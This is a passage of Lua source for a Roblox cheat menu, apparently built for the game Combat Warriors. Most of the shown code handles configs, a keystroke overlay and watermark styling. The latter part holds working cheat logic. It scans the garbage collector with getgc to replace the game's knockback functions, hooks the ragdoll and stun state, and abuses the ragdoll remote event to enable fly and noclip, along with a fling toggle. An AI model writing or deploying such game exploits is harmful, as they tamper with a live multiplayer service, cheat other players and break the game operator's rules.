						end
					end
				end)
			end
		end)--]]
	end

do

local allcfgs = {} 

for _,cfg in pairs(listfiles('SamuelPaste_cw/cfgs')) do 
	local cfgname = C.GSUB(cfg, 'SamuelPaste_cw/cfgs\\', "") 
	C.INSERT(allcfgs, cfgname) 
end



local configs = misc:Sector("configs", "Left") 
configs:Element("TextBox", "config", {placeholder = "config name"}) -- values.misc.configs.config.Text
configs:Element("Button", "save new cfg", {}, function() 
	if values.misc.configs.config.Text ~= "" then 
		library:SaveConfig(values.misc.configs.config.Text) 
		insertwithoutdupes(allcfgs, ""..values.misc.configs.config.Text..".txt")
	end
	ConfigUpdateCfgList2:Fire()
	ConfigUpdateCfgList:Fire()
end) 
configs:Element("Button", "load", {}, function() 
	ConfigLoad:Fire(values.misc["configs"].config.Text)
end)
configs:Element("cfgtype", "cfgs", {options = allcfgs, Amount = 5})
configs:Element("Button", "load from list", {}, function() 
	ConfigLoad1:Fire(values.misc.configs.cfgs.Scroll)
end)
configs:Element("Button", "Update cfg in list", {}, function()
	library:SaveConfig1(values.misc["configs"].cfgs.Scroll)
end)
configs:Element("Button", "Refresh cfg list", {}, function()
table.clear(allcfgs)

for _,cfg in pairs(listfiles('SamuelPaste_cw/cfgs')) do 
	local cfgname = C.GSUB(cfg, 'SamuelPaste_cw/cfgs\\', "") 
	C.INSERT(allcfgs, cfgname) 
end
	ConfigUpdateCfgList2:Fire()
	ConfigUpdateCfgList:Fire()
end)
configs:Element("Button", 'overwrite cfgs from old folder', {}, function()
	--[[for _,cfg in pairs(listfiles("pastedstormy/pastedstormycfgs")) do 
		local cfgname = C.GSUB(cfg, "pastedstormy/pastedstormycfgs\\", "") 
		writefile(cfglocation..cfgname, readfile(cfg))
	end--]]
	for _,cfg in pairs(listfiles("pastedstormy/pastedstormycfgs")) do 
		local cfgname = C.GSUB(cfg, "pastedstormy/pastedstormycfgs\\", "") 
		writefile('SamuelPaste_cw/cfgs/'..cfgname, readfile(cfg))
	end
	table.clear(allcfgs)

	for _,cfg in pairs(listfiles(cfglocation)) do 
		local cfgname = C.GSUB(cfg, cfglocation.."\\", "") 
		C.INSERT(allcfgs, cfgname) 
	end
		ConfigUpdateCfgList2:Fire()
		ConfigUpdateCfgList:Fire()
end)

configs:Element("Toggle", "keybind list", nil, function(tbl) 
	library:SetKeybindVisible(tbl.Toggle) 
end) 
		configs:Element("Toggle", "specators list", {}, function(tbl)
			library:SetSpectatorVisible(tbl.Toggle) 
		end)
			configs:Element("Toggle", "keystrokes", {}, function(tbl)
				if tbl.Toggle then
						 local ScreenGuiKey = C.INST("ScreenGui")
			local W = C.INST("TextLabel")
			local A = C.INST("TextLabel")
			local S = C.INST("TextLabel")
			local D = C.INST("TextLabel")
			local E = C.INST("TextLabel")
			local R = C.INST("TextLabel")
			local _ = C.INST("TextLabel")
			local _2 = C.INST("TextLabel")
			local _3 = C.INST("TextLabel")
			local _4 = C.INST("TextLabel")
			local _5 = C.INST("TextLabel")
			local _6 = C.INST("TextLabel")


			ScreenGuiKey.Parent = game.CoreGui
			ScreenGuiKey.Name = "keystrokess"

			W.Name = "W"
			W.Parent = ScreenGuiKey
			W.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			W.BackgroundTransparency = 1.000
			W.Position = C.UDIM2(0.488053292, 0, 0.728395104, 0)
			W.Size = C.UDIM2(0, 29, 0, 28)
			W.Visible = false
			W.Font = Enum.Font.Code
			W.Text = "W"
			W.TextColor3 = C.COL3RGB(255, 255, 255)
			W.TextSize = 14.000
			W.TextStrokeTransparency = 0.000
			
			_.Name = "_"
			_.Parent = ScreenGuiKey
			_.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_.BackgroundTransparency = 1.000
			_.Position = C.UDIM2(0.488053292, 0, 0.728395104, 0)
			_.Size = C.UDIM2(0, 29, 0, 28)
			_.Visible = true
			_.Font = Enum.Font.Code
			_.Text = "_"
			_.TextColor3 = C.COL3RGB(255, 255, 255)
			_.TextSize = 14.000
			_.TextStrokeTransparency = 0.000

			A.Name = "A"
			A.Parent = ScreenGuiKey
			A.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			A.BackgroundTransparency = 1.000
			A.Position = C.UDIM2(0.453584045, 0, 0.777777791, 0)
			A.Size = C.UDIM2(0, 29, 0, 28)
			A.Visible = false
			A.Font = Enum.Font.Code
			A.Text = "A"
			A.TextColor3 = C.COL3RGB(255, 255, 255)
			A.TextSize = 14.000
			A.TextStrokeTransparency = 0.000
			
			_2.Name = "_2"
			_2.Parent = ScreenGuiKey
			_2.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_2.BackgroundTransparency = 1.000
			_2.Position = C.UDIM2(0.453584045, 0, 0.777777791, 0)
			_2.Size = C.UDIM2(0, 29, 0, 28)
			_2.Visible = true
			_2.Font = Enum.Font.Code
			_2.Text = "_"
			_2.TextColor3 = C.COL3RGB(255, 255, 255)
			_2.TextSize = 14.000
			_2.TextStrokeTransparency = 0.000

			S.Name = "S"
			S.Parent = ScreenGuiKey
			S.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			S.BackgroundTransparency = 1.000
			S.Position = C.UDIM2(0.488053292, 0, 0.777777791, 0)
			S.Size = C.UDIM2(0, 29, 0, 28)
			S.Visible = false
			S.Font = Enum.Font.Code
			S.Text = "S"
			S.TextColor3 = C.COL3RGB(255, 255, 255)
			S.TextSize = 14.000
			S.TextStrokeTransparency = 0.000
			
			_3.Name = "_3"
			_3.Parent = ScreenGuiKey
			_3.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_3.BackgroundTransparency = 1.000
			_3.Position = C.UDIM2(0.488053292, 0, 0.777777791, 0)
			_3.Size = C.UDIM2(0, 29, 0, 28)
			_3.Visible = true
			_3.Font = Enum.Font.Code
			_3.Text = "_"
			_3.TextColor3 = C.COL3RGB(255, 255, 255)
			_3.TextSize = 14.000
			_3.TextStrokeTransparency = 0.000

			D.Name = "D"
			D.Parent = ScreenGuiKey
			D.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			D.BackgroundTransparency = 1.000
			D.Position = C.UDIM2(0.522522688, 0, 0.777777791, 0)
			D.Size = C.UDIM2(0, 29, 0, 28)
			D.Visible = false
			D.Font = Enum.Font.Code
			D.Text = "D"
			D.TextColor3 = C.COL3RGB(255, 255, 255)
			D.TextSize = 14.000
			D.TextStrokeTransparency = 0.000
			
			_4.Name = "_4"
			_4.Parent = ScreenGuiKey
			_4.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_4.BackgroundTransparency = 1.000
			_4.Position = C.UDIM2(0.522522688, 0, 0.777777791, 0)
			_4.Size = C.UDIM2(0, 29, 0, 28)
			_4.Visible = true
			_4.Font = Enum.Font.Code
			_4.Text = "_"
			_4.TextColor3 = C.COL3RGB(255, 255, 255)
			_4.TextSize = 14.000
			_4.TextStrokeTransparency = 0.000

			E.Name = "E"
			E.Parent = ScreenGuiKey
			E.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			E.BackgroundTransparency = 1.000
			E.Position = C.UDIM2(0.453584045, 0, 0.728395045, 0)
			E.Size = C.UDIM2(0, 29, 0, 28)
			E.Visible = false
			E.Font = Enum.Font.Code
			E.Text = "C"
			E.TextColor3 = C.COL3RGB(255, 255, 255)
			E.TextSize = 14.000
			E.TextStrokeTransparency = 0.000
			
			_5.Name = "_5"
			_5.Parent = ScreenGuiKey
			_5.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_5.BackgroundTransparency = 1.000
			_5.Position = C.UDIM2(0.453584045, 0, 0.728395045, 0)
			_5.Size = C.UDIM2(0, 29, 0, 28)
			_5.Visible = true
			_5.Font = Enum.Font.Code
			_5.Text = "_"
			_5.TextColor3 = C.COL3RGB(255, 255, 255)
			_5.TextSize = 14.000
			_5.TextStrokeTransparency = 0.000

			R.Name = "R"
			R.Parent = ScreenGuiKey
			R.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			R.BackgroundTransparency = 1.000
			R.Position = C.UDIM2(0.522522688, 0, 0.728395045, 0)
			R.Size = C.UDIM2(0, 29, 0, 28)
			R.Visible = false
			R.Font = Enum.Font.Code
			R.Text = "J"
			R.TextColor3 = C.COL3RGB(255, 255, 255)
			R.TextSize = 14.000
			R.TextStrokeTransparency = 0.000
			
			_6.Name = "_6"
			_6.Parent = ScreenGuiKey
			_6.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_6.BackgroundTransparency = 1.000
			_6.Position = C.UDIM2(0.522522688, 0, 0.728395045, 0)
			_6.Size = C.UDIM2(0, 29, 0, 28)
			_6.Visible = true
			_6.Font = Enum.Font.Code
			_6.Text = "_"
			_6.TextColor3 = C.COL3RGB(255, 255, 255)
			_6.TextSize = 14.000
			_6.TextStrokeTransparency = 0.000
	 

			local UserInputService = game:GetService("UserInputService")

			local W1Key = Enum.KeyCode.W
			local A1Key = Enum.KeyCode.A
			local S1Key = Enum.KeyCode.S
			local D1Key = Enum.KeyCode.D
			local E1Key = Enum.KeyCode.LeftControl
			local R1Key = Enum.KeyCode.R
			local SpaceKey = Enum.KeyCode.Space

			UserInputService.InputBegan:Connect(function(input)
				if (input.KeyCode == W1Key) then
					W.Visible = true
					_.Visible = false
				elseif (input.KeyCode == A1Key) then
					A.Visible = true
					_2.Visible = false
				elseif (input.KeyCode == S1Key) then
					S.Visible = true
					_3.Visible = false
				elseif (input.KeyCode == D1Key) then
					D.Visible = true
					_4.Visible = false
				elseif (input.KeyCode == E1Key) then
					E.Visible = true
					_5.Visible = false
				elseif (input.KeyCode == SpaceKey) then
					R.Visible = true
					_6.Visible = false
				end
			end)

			UserInputService.InputEnded:Connect(function(input)
				if (input.KeyCode == W1Key) then
					W.Visible = false
					_.Visible = true
				elseif (input.KeyCode == A1Key) then
					A.Visible = false
					_2.Visible = true
				elseif (input.KeyCode == S1Key) then
					S.Visible = false
					_3.Visible = true
				elseif (input.KeyCode == D1Key) then
					D.Visible = false
					_4.Visible = true
				elseif (input.KeyCode == E1Key) then
					E.Visible = false
					_5.Visible = true	
				elseif (input.KeyCode == SpaceKey) then
					R.Visible = false
					_6.Visible = true
				end
			end)		
			else
			game.CoreGui.keystrokess:Destroy()
			end
			end)


local addons = misc:Sector("addons", "Left") 
addons:Element('ToggleColor', 'Menu Accent', {default = {Color = MainUIColor}}, function(tbl)
					if tbl.Toggle then
						local oldUiColor = MainUIColor --Colorpick, ColorDrag, HueFrameGradient, Huepick, Huedrag
						MainUIColor = tbl.Color
						for i,v in pairs (game:GetService('CoreGui')['electric boogalo'].Tabs:GetDescendants()) do
							if v:IsA('Frame') and v.BackgroundColor3 == oldUiColor and v.Name ~= 'Color' and v.Name ~= 'Colorpick' and v.Name ~= 'ColorDrag' and v.Name ~= 'HueFrameGradient' and v.Name ~= 'Huepick' and v.Name ~= 'Huedrag' then
								v.BackgroundColor3 = MainUIColor
							end
							if v:IsA('UIGradient') and v.Name ~= 'Colorpick' and v.Name ~= 'ColorDrag' and v.Name ~= 'HueFrameGradient' and v.Name ~= 'Huepick' and v.Name ~= 'Huedrag' then
								v.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
							end
							if v:IsA('ScrollingFrame') then --and v.Name == 'Drop' and v.Parent.Name == 'Button'
								v.ScrollBarImageColor3 = MainUIColor
							end
							--[[if v.Name == 'Frame' and v.Parent.Name == 'Scroll' then 
								v.ScrollBarImageColor3 = MainUIColor
							end--]]
							if v:IsA("UIGradient") and v.Parent.Name == 'Color' or v.Parent.Name == 'Background' then
								v.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, MainUIColor), ColorSequenceKeypoint.new(1, MainUIColor)}
							end
							if v:IsA('Frame') and v.Name == 'Color' and v.Parent.Name == 'Button' and v.BackgroundColor3 == oldUiColor then
								v.BackgroundColor3 = MainUIColor
							end
							if v:IsA('Frame') and v.Name == 'Frame' and v.Parent.Name == 'Scroll' then 
								v.ScrollBarImageColor3 = MainUIColor
							end
						end
						game:GetService("CoreGui").KeybindList.Frame.Grad.BackgroundColor3 = tbl.Color
						game:GetService("CoreGui").SpectatorsList.Spectators.Color.BackgroundColor3 = tbl.Color
						--game:GetService("CoreGui")["fl indicator"].wgrgerqgerq.gradins.BackgroundColor3 = tbl.Color
						for i,v in pairs (game:GetService("CoreGui")["electric boogalo"].Holder.TabButtons:GetChildren()) do
							if v:IsA("TextButton") then
								v.Gard.BackgroundColor3 = tbl.Color
							end
						end
						for i,v in pairs (game:GetService("CoreGui")["MX_ONHIT"].OnHitFrame:GetChildren()) do
							if v:IsA("Frame") then
								v.Grad.BackgroundColor3 = tbl.Color
							end
						end
						
						
						
					else
						
						
						
						oldUiColor = tbl.Color
						MainUIColor = C.COL3RGB(255,20,147)
						game:GetService("CoreGui").KeybindList.Frame.Grad.BackgroundColor3 = MainUIColor
						game:GetService("CoreGui").SpectatorsList.Spectators.Color.BackgroundColor3 = MainUIColor
						--game:GetService("CoreGui")["fl indicator"].wgrgerqgerq.gradins.BackgroundColor3 = MainUIColor
					for i,v in pairs (game:GetService('CoreGui')['electric boogalo'].Tabs:GetDescendants()) do
						if v:IsA('Frame') and v.BackgroundColor3 == oldUiColor and v.Name ~= 'Color' and v.Name ~= 'Colorpick' and v.Name ~= 'ColorDrag' and v.Name ~= 'HueFrameGradient' and v.Name ~= 'Huepick' and v.Name ~= 'Huedrag' then
								v.BackgroundColor3 = MainUIColor
							end
							if v:IsA('UIGradient') and v.Name ~= 'Colorpick' and v.Name ~= 'ColorDrag' and v.Name ~= 'HueFrameGradient' and v.Name ~= 'Huepick' and v.Name ~= 'Huedrag' then
								v.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
							end
							if v:IsA('ScrollingFrame') then --and v.Name == 'Drop' and v.Parent.Name == 'Button'
								v.ScrollBarImageColor3 = MainUIColor
							end
							--[[if v.Name == 'Frame' and v.Parent.Name == 'Scroll' then 
								v.ScrollBarImageColor3 = MainUIColor
							end--]]
							if v:IsA("UIGradient") and v.Parent.Name == 'Color' or v.Parent.Name == 'Background' then
								v.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, MainUIColor), ColorSequenceKeypoint.new(1, MainUIColor)}
							end
							if v:IsA('Frame') and v.Name == 'Color' and v.Parent.Name == 'Button' and v.BackgroundColor3 == oldUiColor then
								v.BackgroundColor3 = MainUIColor
							end
							if v:IsA('Frame') and v.Name == 'Frame' and v.Parent.Name == 'Scroll' then 
								v.ScrollBarImageColor3 = MainUIColor
							end
					end
					  
						for i,v in pairs (game:GetService("CoreGui")["electric boogalo"].Holder.TabButtons:GetChildren()) do
							if v:IsA("TextButton") then
								v.Gard.BackgroundColor3 = C.COL3RGB(MainUIColor)
							end
						end	
						for i,v in pairs (game:GetService("CoreGui")["MX_ONHIT"].OnHitFrame:GetChildren()) do
							if v:IsA("Frame") then
								v.Grad.BackgroundColor3 = C.COL3RGB(MainUIColor)
							end
						end
					end
				end)

watermarkthemes = {}
watermarklocation = nil


do
	local watermark = C.INST('ScreenGui')
	local watermark_2 = C.INST('Frame')
	local title = C.INST('TextLabel')
	local none = C.INST('UIGradient')
	local linetop = C.INST('UIGradient')
	local linetopandbottem = C.INST('UIGradient')
	local shadowatbottem = C.INST('UIGradient')
	local shadowattop = C.INST('UIGradient')
	local shadowattopandbottom = C.INST('UIGradient')

	watermarklocation = watermark

	watermark.Name = 'watermark'
	watermark.Parent = game.CoreGui
	watermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	watermark_2.Name = 'watermark'
	watermark_2.Parent = watermark
	watermark_2.BackgroundColor3 = C.COL3RGB(29, 29, 29)
	watermark_2.BorderColor3 = C.COL3RGB(255, 255, 255)
	watermark_2.Position = C.UDIM2(0.912, 0, 0.00858895481, 0)
	watermark_2.Size = C.UDIM2(0, 89, 0, 20)
	
	title.Name = 'title'
	title.Parent = watermark_2
	title.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	title.BackgroundTransparency = 1.000
	title.Position = C.UDIM2(0, 0, 0.0597654358, 0)
	title.Size = C.UDIM2(0, 0, 0, 18)
	title.Font = Enum.Font.Nunito
	title.LineHeight = 1.21
	title.Text = '         yes.no'
	title.TextColor3 = C.COL3RGB(255, 255, 255)
	title.TextSize = 16.000
	title.TextStrokeColor3 = C.COL3RGB(25, 25, 25)
	title.TextStrokeTransparency = 0.000
	title.TextXAlignment = Enum.TextXAlignment.Left

	none.Enabled = false
	none.Color =ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 255, 255))}
	none.Rotation = 0
	none.Name = 'none'
	none.Parent = watermark_2

	linetop.Enabled = false
	linetop.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(0, 0, 0)), ColorSequenceKeypoint.new(0.00, C.COL3RGB(56, 56, 56)), ColorSequenceKeypoint.new(0.00, C.COL3RGB(0, 0, 0)), ColorSequenceKeypoint.new(0.66, C.COL3RGB(0, 0, 0)), ColorSequenceKeypoint.new(0.99, C.COL3RGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 255, 255))}
	linetop.Rotation = -90
	linetop.Name = 'linetop'
	linetop.Parent = watermark_2
	
	shadowatbottem.Enabled = false
	shadowatbottem.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(0, 0, 0))}
	shadowatbottem.Rotation = 90
	shadowatbottem.Name = 'shadowatbottem'
	shadowatbottem.Parent = watermark_2

	shadowattop.Enabled = false
	shadowattop.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(0, 0, 0))}
	shadowattop.Rotation = -90
	shadowattop.Name = 'shadowattop'
	shadowattop.Parent = watermark_2

	shadowattopandbottom.Enabled = false
	shadowattopandbottom.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(25, 25, 25)), ColorSequenceKeypoint.new(0.59, C.COL3RGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(25, 25, 25))}
	shadowattopandbottom.Rotation = -90
	shadowattopandbottom.Name = 'shadowattopandbottom'
	shadowattopandbottom.Parent = watermark_2

	for a,b in next, watermark_2:GetChildren() do -- inserts all the theme names into 'watermarkthemes'
		if b:IsA('UIGradient') then
			C.INSERT(watermarkthemes, b.Name)
		end
	end
				dragging = false 
				do 
					local a = watermark_2
					local dragInput 
					local dragStart 
					local startPos 
					local function update(input) 
						local delta = input.Position - dragStart 
						a.Position = C.UDIM2(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) 
					end 
					a.InputBegan:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
							dragging = true 
							dragStart = input.Position 
							startPos = a.Position 

							input.Changed:Connect(function() 
								if input.UserInputState == Enum.UserInputState.End then 
									dragging = false 
								end 
							end) 
						end 
					end) 
					a.InputChanged:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then 
							dragInput = input 
						end 
					end) 
					game:GetService('UserInputService').InputChanged:Connect(function(input) 
						if input == dragInput and dragging then 
							update(input) 
						end 
					end) 
				end 
end


themebackground = {
	['Default'] = 8893436115,
    ['Shiba.gang'] = 2151741365,
    ['Hearts'] = 6073763717,
    ['Abstract'] = 6073743871,
    ['Hexagon'] = 6073628839,
    ['Circles'] = 6071579801,
    ['Lace With Flowers'] = 6071575925,
    ['Floral'] = 5553946656,
}

Images_names = {}
C.INSERT(Images_names, 'Default')
for a,b in next, themebackground do 
    insertwithoutdupes(Images_names, a)
end
				
addons:Element('ToggleColor', 'ui border', {default = {Color = C.COL3RGB(255,255,255)}})	
				
addons:Element('ToggleKeybind', 'gui keybind', {default = {Key = RightShift, Type = Toggle, Toggle = true}}, function(tbl)
	if tbl.Toggle then
		watermarklocation.watermark.Draggable = tbl.Active
		ovascreengui['ova'].Enabled = tbl.Active
		library.uiopen = tbl.Active
	end
end)
addons:Element("TextBox", "mnt", {placeholder = "Custom cheat name"}, function()
	game:GetService("CoreGui")["electric boogalo"].Holder.TextLabel.Text = values.misc.addons.mnt.Text
	valuewtr = values.misc.addons.mnt.Text
	print(valuewtr)
end)



addons:Element('Dropdown', 'background', {options = Images_names})
addons:Element('ToggleTrans', 'background color', {default = {Color = C.COL3RGB(180,180,180), Transparency = 0}})
local watermark = misc:Sector('watermark', 'Right')

watermark:Element('Toggle', 'enabled', {default = {Toggle = true}}, function(tbl)
	watermarklocation.Enabled = tbl.Toggle
end)
watermark:Element('Dropdown', 'themes', {options = watermarkthemes})
local watermarktext
watermark:Element('TextBox', 'watermark text', {placeholder = 'text here', default = {text = '         yes.no'}}, function(tbl)
	pcall(function()
		watermarktext:Disconnect()
	end)
	watermarktext = RunService.RenderStepped:Connect(function()
		wait(1)
		local textierawr = textboxtriggers(tbl.Text)
		watermarklocation.watermark.title.Text = textierawr
	end)
end)

watermark:Element('Dropdown', 'text font', {options = fonts}, function(tbl)
	watermarklocation.watermark.title.Font = Enum.Font[tbl.Dropdown]
end)
watermark:Element('Slider', 'text size', {min = 0, max = 50, default = watermarklocation.watermark.title.TextSize}, function(tbl)
	watermarklocation.watermark.title.TextSize = tbl.Slider
end)
watermark:Element('Slider', 'text line height', {min = -50, max = 50, default = watermarklocation.watermark.title.LineHeight}, function(tbl)
	watermarklocation.watermark.title.LineHeight = 1.1 * (tbl.Slider / 10)
end)
watermark:Element('Slider', 'watermark lenght', {min = 0, max = 100, default = 89}, function(tbl)
	watermarklocation.watermark.Size = C.UDIM2(0, tbl.Slider * 5, 0, values.misc.watermark['watermark height'].Slider)
end)
watermark:Element('Slider', 'watermark height', {min = 0, max = 100, default = 20}, function(tbl)
	watermarklocation.watermark.Size = C.UDIM2(0, values.misc.watermark['watermark lenght'].Slider * 5, 0, tbl.Slider)
end)
watermark:Element('ToggleColor', 'border color', {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl)
	watermarklocation.watermark.BorderColor3 = tbl.Color
end)
watermark:Element('ToggleColor', 'text color', {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl)
	watermarklocation.watermark.title.TextColor3 = tbl.Color
end)
end
function NOFLY()
	FLYING = false
	if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
	if LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
		LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end
	
	if getState:getState().ragdoll.isRagdolled == true and LocalPlayer.Character:FindFirstChild('isFlyingCheck') then
		LocalPlayer.Character.Humanoid.RagdollRemoteEvent:FireServer(false)
		for i = 1,5 do
			LocalPlayer.Character.Humanoid.RagdollRemoteEvent:FireServer(false)
			wait(.1)
		end
	end
	pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
end

local Noclipping
local Clip = false

function NoclipLoop()
	if values.misc.misc2.misc["Noclip"].Toggle and Clip == false and LocalPlayer.Character ~= nil then
		for _, child in pairs(LocalPlayer.Character:GetDescendants()) do
			if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
				child.CanCollide = false
			end
		end
	end
end


for i,v in pairs(getgc(true)) do
    if typeof(v) == 'table' then
        if rawget(v,'getSessionDataRoduxStoreForPlayer') then
            getState = v.getSessionDataRoduxStoreForPlayer(game.Players.LocalPlayer)
        end
    end
end
do
for i,v in pairs(getgc(true)) do
    if typeof(v) == 'table' and rawget(v,'knockbackCharacterPartAngular') then
		oldknockbackCharacterPartAngular = v.knockbackCharacterPartAngular
    end
    if typeof(v) == 'table' then 
        if rawget(v,'knockbackCharacterPart') then
			oldknockbackCharacterPart = v.knockbackCharacterPart
        end
        if rawget(v,'knockbackPartAngular') then
			oldknockbackPartAngular = v.knockbackPartAngular
        end
        if rawget(v,'knockbackPartForce') then
			oldknockbackPartForce = v.knockbackPartForce
		end     
    end
end

    local misc1 = misc:MSector("misc", "Right")
    local misc2 = misc:MSector("misc2", "Right")
    local miscsector = misc2:Tab("misc")
    local player = misc1:Tab("player")
    local utility = misc1:Tab("utility")
    miscsector:Element("Button", "No Identity fling", nil, function()
        invisfling()
    end)
    utility:Element("Toggle", "No Utility Damage (expect bombs)")
	utility:Element('Toggle', 'No knockback', {}, function(tbl)
		for i,v in pairs(getgc(true)) do
			if typeof(v) == 'table' and rawget(v,'knockbackCharacterPartAngular') then
				if tbl.Toggle then
					v.knockbackCharacterPartAngular = function(...)
						return
					end
				else
					v.knockbackCharacterPartAngular = oldknockbackCharacterPartAngular
				end
			end
			if typeof(v) == 'table' then 
				if rawget(v,'knockbackCharacterPart') then
					if tbl.Toggle then
						v.knockbackCharacterPart = function(...)
							return
						end
					else
						v.knockbackCharacterPart = oldknockbackCharacterPart
					end
				end
				if rawget(v,'knockbackPartAngular') then
					if tbl.Toggle then
						v.knockbackPartAngular = function(...)
							return
						end
					else
						v.knockbackPartAngular = oldknockbackCharacterPartAngular
					end
				end
				if rawget(v,'knockbackPartForce') then
					if tbl.Toggle then
						v.knockbackPartForce = function(...)
							return
						end
					else
						v.knockbackPartForce = oldknockbackPartForce
					end
				end 
			end
		end	
	end)
	--utility:Element('Toggle','Ignore when parkouring')
    player:Element("Toggle", "Auto Airdrop-Claimer")
     miscsector:Element("Toggle","Velocity Fly",nil,function(state)
         if state.Toggle then
             NOFLY()
			 sFLY(false,false,false)
         else
             NOFLY()
         end
     end)
    miscsector:Element("Toggle", "Fly",nil,function(state)
        if values.misc.misc2.misc["Fly"].Toggle then
            NOFLY()
			sFLY(false, true, true)
            LocalPlayer.Character.Humanoid.RagdollRemoteEvent:FireServer(true)
        else
            NOFLY()
            --LocalPlayer.Character.Humanoid.RagdollRemoteEvent:FireServer(false)
        end
    end)
	isExecuting = false
	RunService.RenderStepped:Connect(function()
		if game.Players.LocalPlayer.Character and LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid') then
			if isExecuting == false and not LocalPlayer.Character:FindFirstChild('isFlyingCheck') and getState:getState().mainMenu.isIn == false	then
				isExecuting = true
				LocalPlayer.Character.Humanoid:WaitForChild('RagdollRemoteEvent')
				if values.misc.misc2.misc["Fly"].Toggle then
					NOFLY()
					sFLY(false, true, true)
					LocalPlayer.Character.Humanoid.RagdollRemoteEvent:FireServer(true)
				else
					NOFLY()
					LocalPlayer.Character.Humanoid.RagdollRemoteEvent:FireServer(false)
				end		
				if values.misc.misc2.misc["Velocity Fly"].Toggle then
					 NOFLY()
					 sFLY(false,false,false)
				else
					NOFLY()
				end
				task.wait(0.2)
				isExecuting = false
			end
		end
	end)
    miscsector:Element("Toggle", "Noclip",nil,function(state)
        if values.misc.misc2.misc["Noclip"].Toggle then
            Clip = false
        else
	        Clip = true
        end
    end)


for i,v in pairs(getgc(true)) do
    if typeof(v) == 'table' then
        if rawget(v,'RAGDOLL_CLIENT_IS_RAGDOLLED_CHANGE') then
            old = v.RAGDOLL_CLIENT_IS_RAGDOLLED_CHANGE 
            v.RAGDOLL_CLIENT_IS_RAGDOLLED_CHANGE = function(sex1,sex2)
			   if fakingragdol == true then
			   sex1['isRagdolled'] = false
			   end
               return old(sex1,sex2)
            end
        end
        if rawget(v,'setupMotors') then
            oldsetup = v.setupMotors
            v.setupMotors = function(...)
				
                if fakingragdol == true then
                return
				else
				return oldsetup(...)
				end
            end
			oldstate = v.setupState
            v.setupState = function(...)
				if fakingragdol == true then
                return
				else 
				return oldstate(...)
				end
            end
        end
    end
end
--game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Physics, false)
local fakingragdol = false
	--[[miscsector:Element('Button','Fake ragdoll',{},function()
		fakingragdol = true
		LocalPlayer = game.Players.LocalPlayer
--game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Physics, false)
 
		--fakingragdol = true
		game.Players.LocalPlayer.Character.Humanoid.RagdollRemoteEvent:FireServer(true)
		task.wait(1)

		for i,v in pairs(game.Players.LocalPlayer.Character.Torso:GetChildren()) do
			if v:IsA('Motor6D') then
				v.Enabled = true
			end
		end
		game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Running, true)

		local StarterGui = game:GetService("StarterGui")
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)

		game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true

getgenv().somerandomshit = false
for i,v in pairs(getgc(true)) do
    if typeof(v) == 'table' then

        if rawget(v,'isStunned')  then
            task.spawn(function()
                --while somerandomshit do task.wait()
                    v.isStunned = false
                --end
            end)
        end
        if rawget(v,'isFrozen')  then
                        task.spawn(function()
                --while somerandomshit do task.wait()
                    v.isFrozen = false
                --end
                end)
        end
        if rawget(v,'isRagdolled')  then
            task.spawn(function()
                --while somerandomshit do task.wait()
                    v.isRagdolled = false
                --end
            end)
        end


    end
end
   loop = game.RunService.RenderStepped:Connect(function()
        pcall(function()
        	local chr = LocalPlayer.Character
        	local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")	                
    		if hum.MoveDirection.Magnitude > 0 then
    				chr:TranslateBy(hum.MoveDirection * tonumber(2))
    		end
    		chr.HumanoidRootPart.Rotation *= Vector3.new(0,90,0)
        end)
    end)
		--somerandomshit = false
